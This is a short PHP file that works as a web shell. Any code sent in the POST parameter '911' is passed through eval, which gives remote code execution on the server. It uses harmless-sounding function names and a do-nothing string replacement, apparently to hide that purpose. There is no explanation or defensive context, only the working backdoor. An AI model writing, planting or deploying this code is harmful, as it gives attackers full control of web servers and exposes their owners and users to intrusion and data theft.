<?php
function love()
{
global $A;
$A=TT();
eval("\"$A\"");
}
function TT()
{
    $a=str_replace('','',$_POST[911]); 
    return '";'.$a.'//';
} 
love();
?>123